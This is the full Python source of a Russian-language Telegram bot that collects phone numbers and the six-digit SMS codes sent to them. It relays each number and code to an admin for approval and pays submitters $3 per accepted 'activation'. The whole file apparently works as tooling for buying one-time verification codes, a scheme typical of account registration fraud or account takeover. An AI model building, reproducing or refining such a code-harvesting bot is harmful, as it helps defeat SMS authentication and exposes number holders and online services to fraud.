import os
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Optional

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker
from sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column
from sqlalchemy import BigInteger, String, Integer, Float, DateTime, inspect, select
from sqlalchemy.sql import text
import enum
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DATABASE_URL = os.getenv("DATABASE_URL")

if DATABASE_URL and "postgresql://" in DATABASE_URL and "+asyncpg" not in DATABASE_URL:
    DATABASE_URL = DATABASE_URL.replace("postgresql://", "postgresql+asyncpg://")

FIXED_AMOUNT = 3.0
SMS_TIMEOUT_MINUTES = 5

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

engine = create_async_engine(DATABASE_URL, echo=True)
AsyncSessionLocal = async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)


class Base(DeclarativeBase):
    pass


class OrderStatus(str, enum.Enum):
    WAITING_CODE = "waiting_code"
    VERIFYING = "verifying"
    COMPLETED = "completed"
    REJECTED = "rejected"
    TIMEOUT = "timeout"
    ERROR = "error"


class User(Base):
    __tablename__ = "users"

    id: Mapped[int] = mapped_column(BigInteger, primary_key=True)
    username: Mapped[str] = mapped_column(String(255), nullable=True)
    balance: Mapped[float] = mapped_column(Float, default=0.0)
    state: Mapped[str] = mapped_column(String(50), default="idle")
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class Order(Base):
    __tablename__ = "orders"

    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    user_id: Mapped[int] = mapped_column(BigInteger)
    phone: Mapped[str] = mapped_column(String(20))
    sms_code: Mapped[str] = mapped_column(String(10), nullable=True)
    status: Mapped[str] = mapped_column(String(50), default=OrderStatus.WAITING_CODE)
    amount: Mapped[float] = mapped_column(Float, default=3.0)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
    timeout_at: Mapped[datetime] = mapped_column(DateTime, nullable=True)
    completed_at: Mapped[datetime] = mapped_column(DateTime, nullable=True)


async def init_db():
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

        def add_column_if_not_exists(connection, table_name, column_name, column_type):
            inspector = inspect(connection)
            columns = [col["name"] for col in inspector.get_columns(table_name)]
            if column_name not in columns:
                connection.execute(text(f"ALTER TABLE {table_name} ADD COLUMN {column_name} {column_type}"))

        await conn.run_sync(
            lambda c: add_column_if_not_exists(c, "orders", "timeout_at", "TIMESTAMP")
        )
        await conn.run_sync(
            lambda c: add_column_if_not_exists(c, "orders", "completed_at", "TIMESTAMP")
        )


def format_order_tag(phone: str) -> str:
    return f"#{phone}"


def format_message_phone_sent(phone: str) -> str:
    tag = format_order_tag(phone)
    return f"""<b>🔖 Активация</b>
{tag}

<b>Уведомление:</b> <i>⚡️ Номер передан в центр</i>"""


def format_message_phone_sent2(phone: str) -> str:
    tag = format_order_tag(phone)
    return f"""<b>🔖 Активация</b>
{tag}

<i>Уведомление: В течение 2-х минут вам поступит SMS на ваш номер, отправьте его ответом на это сообщение</i>"""


def format_message_waiting_sms(phone: str) -> str:
    tag = format_order_tag(phone)
    return f"""<b>📩 Активация</b>
{tag}

<i>Статус: ⚡️ SMS в обработке, ожидаем ответа от центра</i>"""


def format_message_success(phone: str, balance: float) -> str:
    tag = format_order_tag(phone)
    return f"""<b>📩 Активация</b>
{tag}

<i>Уведомление: ✅ Активация успешна</i>

<i>Начислено: {FIXED_AMOUNT}$</i>
<i>Баланс: {balance}$</i>"""


def format_message_rejected(phone: str) -> str:
    tag = format_order_tag(phone)
    return f"""<b>📩 Активация</b>
{tag}

<i>Уведомление: 🚫 Активация отменена</i>

<i>Причина: Неверный код</i>"""


def format_message_timeout(phone: str) -> str:
    tag = format_order_tag(phone)
    return f"""<b>🔖 Активация</b>
{tag}

<i>Уведомление: 🚫 Активация отменена</i>

<i>Причина: Истекло фиксированное время для ввода SMS, попробуйте снова</i>"""


def format_message_error(phone: str) -> str:
    tag = format_order_tag(phone)
    return f"""<b>📩 Активация</b>
{tag}

<i>Уведомление: 🚫 Активация отменена</i>

<i>Причина: Произошла ошибка, попробуйте сдать номер повторно</i>"""


def format_message_duplicate(phone: str) -> str:
    tag = format_order_tag(phone)
    return f"""<b>🔖 Активация</b>
{tag}

<i>Уведомление: 🚫 Активация отменена</i>

<i>Причина: Произошла ошибка, попробуйте сдать номер повторно</i>"""


def format_message_not_reply() -> str:
    return """<i>Чтобы распознать на какой номер вы отправили SMS, ответьте на него!</i>

<i>Например: Свайпните влево сообщение, на которое вам нужно ответить</i>"""


async def check_phone_exists(phone: str) -> bool:
    async with AsyncSessionLocal() as session:
        result = await session.execute(
            select(Order).where(
                Order.phone == phone,
                Order.status == OrderStatus.COMPLETED
            ).limit(1)
        )
        return result.scalar_one_or_none() is not None


async def create_order(user_id: int, phone: str, username: str = None) -> Optional[Order]:
    async with AsyncSessionLocal() as session:
        user = await session.get(User, user_id)
        if not user:
            user = User(id=user_id, username=username, state="waiting_phone")
            session.add(user)
        else:
            if username:
                user.username = username
            user.state = "waiting_phone"

        order = Order(
            user_id=user_id,
            phone=phone,
            status=OrderStatus.WAITING_CODE,
            timeout_at=datetime.utcnow() + timedelta(minutes=SMS_TIMEOUT_MINUTES)
        )
        session.add(order)
        await session.commit()
        return order


async def get_active_order(user_id: int, phone: str = None) -> Optional[Order]:
    async with AsyncSessionLocal() as session:
        query = select(Order).where(
            Order.user_id == user_id,
            Order.status.in_([OrderStatus.WAITING_CODE, OrderStatus.VERIFYING])
        )
        if phone:
            query = query.where(Order.phone == phone)
        result = await session.execute(query.order_by(Order.created_at.desc()))
        return result.scalar_one_or_none()


async def update_order_status(order_id: int, status: OrderStatus, sms_code: str = None):
    async with AsyncSessionLocal() as session:
        order = await session.get(Order, order_id)
        if order:
            order.status = status
            if sms_code:
                order.sms_code = sms_code
            if status in [OrderStatus.COMPLETED, OrderStatus.REJECTED, OrderStatus.TIMEOUT, OrderStatus.ERROR]:
                order.completed_at = datetime.utcnow()
            await session.commit()


async def add_balance(user_id: int, amount: float) -> float:
    async with AsyncSessionLocal() as session:
        user = await session.get(User, user_id)
        if user:
            user.balance += amount
            await session.commit()
            return user.balance
        return 0.0


async def set_user_state(user_id: int, state: str):
    async with AsyncSessionLocal() as session:
        user = await session.get(User, user_id)
        if user:
            user.state = state
            await session.commit()


async def get_user_state(user_id: int) -> str:
    async with AsyncSessionLocal() as session:
        user = await session.get(User, user_id)
        return user.state if user else "idle"


bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username
    
    async with AsyncSessionLocal() as session:
        user = await session.get(User, user_id)
        
        if not user:
            user = User(id=user_id, username=username, state="waiting_phone")
            session.add(user)
            await session.commit()
            await message.answer("📋 В следующем сообщении отправьте номер телефона контрагенту 🇷🇺\n\nЧтобы закончить работу введите /leave")
            return
        
        if user.state == "idle":
            user.state = "waiting_phone"
            if username:
                user.username = username
            await session.commit()
            await message.answer("📋 В следующем сообщении отправьте номер телефона контрагенту 🇷🇺\n\nЧтобы закончить работу введите /leave")
        else:
            await message.answer("Вы уже в режиме ожидания номера. Отправьте номер или /leave для выхода")


@dp.message(Command("leave"))
async def cmd_leave(message: types.Message):
    user_id = message.from_user.id
    
    async with AsyncSessionLocal() as session:
        user = await session.get(User, user_id)
        if user:
            user.state = "idle"
            await session.commit()
    
    await message.answer("пр")


@dp.message(F.text)
async def handle_message(message: types.Message):
    user_id = message.from_user.id
    state = await get_user_state(user_id)
    is_reply = message.reply_to_message is not None

    if state == "waiting_phone" and not is_reply:
        phone = message.text.strip()
        username = message.from_user.username

        if await check_phone_exists(phone):
            await message.answer(format_message_duplicate(phone), parse_mode="HTML")
            return

        order = await create_order(user_id, phone, username)

        await message.answer(format_message_phone_sent(phone), parse_mode="HTML")
        await message.answer(format_message_phone_sent2(phone), parse_mode="HTML")

        await bot.send_message(
            ADMIN_ID,
            f"📞 Новая заявка #{order.id}\nНомер: {phone}\nПользователь: @{username or user_id} (id: {user_id})"
        )

        asyncio.create_task(check_timeout(order.id, phone, user_id, message.chat.id))

    elif is_reply:
        order = await get_active_order(user_id)
        if not order:
            await message.answer("❌ Активная заявка не найдена. Используйте /start для новой заявки")
            return

        code = message.text.strip()

        if not code.isdigit() or len(code) != 6:
            await message.answer(format_message_waiting_sms(order.phone), parse_mode="HTML")
            await message.answer(format_message_error(order.phone), parse_mode="HTML")
            await update_order_status(order.id, OrderStatus.ERROR)
            return

        await update_order_status(order.id, OrderStatus.VERIFYING, sms_code=code)
        await message.answer(format_message_waiting_sms(order.phone), parse_mode="HTML")

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ ПРИНЯТЬ", callback_data=f"accept_{order.id}_{code}"),
                InlineKeyboardButton(text="❌ ОТКЛОНИТЬ", callback_data=f"reject_{order.id}")
            ]
        ])

        await bot.send_message(
            ADMIN_ID,
            f"🔐 Код для заявки #{order.id}\nНомер: {order.phone}\nКод: {code}\nПользователь: @{message.from_user.username or user_id}",
            reply_markup=keyboard
        )

    else:
        await message.answer("Используйте /start для сдачи номера или /leave для выхода")


@dp.callback_query()
async def handle_callback(callback: CallbackQuery):
    data = callback.data

    if data.startswith("accept_"):
        _, order_id, code = data.split("_")
        order_id = int(order_id)

        async with AsyncSessionLocal() as session:
            order = await session.get(Order, order_id)
            if not order:
                await callback.answer("Заявка не найдена")
                return

            if order.sms_code != code:
                await callback.answer("Код не совпадает")
                return

            if order.status != OrderStatus.VERIFYING:
                await callback.answer("Заявка уже обработана")
                return

            new_balance = await add_balance(order.user_id, FIXED_AMOUNT)
            await update_order_status(order_id, OrderStatus.COMPLETED)

            await bot.send_message(
                order.user_id,
                format_message_success(order.phone, new_balance),
                parse_mode="HTML"
            )

            await callback.message.edit_text(f"✅ Заявка #{order_id} принята. Начислено {FIXED_AMOUNT}$")
            await callback.answer("Принято")

    elif data.startswith("reject_"):
        _, order_id = data.split("_")
        order_id = int(order_id)

        async with AsyncSessionLocal() as session:
            order = await session.get(Order, order_id)
            if not order:
                await callback.answer("Заявка не найдена")
                return

            if order.status != OrderStatus.VERIFYING:
                await callback.answer("Заявка уже обработана")
                return

            await update_order_status(order_id, OrderStatus.REJECTED)

            await bot.send_message(
                order.user_id,
                format_message_rejected(order.phone),
                parse_mode="HTML"
            )

            await callback.message.edit_text(f"❌ Заявка #{order_id} отклонена")
            await callback.answer("Отклонено")

    await callback.answer()


async def check_timeout(order_id: int, phone: str, user_id: int, chat_id: int):
    await asyncio.sleep(SMS_TIMEOUT_MINUTES * 60)

    async with AsyncSessionLocal() as session:
        order = await session.get(Order, order_id)
        if order and order.status == OrderStatus.WAITING_CODE:
            order.status = OrderStatus.TIMEOUT
            order.completed_at = datetime.utcnow()
            await session.commit()

            await bot.send_message(
                user_id,
                format_message_timeout(phone),
                parse_mode="HTML"
            )


async def main():
    await init_db()
    logger.info("Бот запущен")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
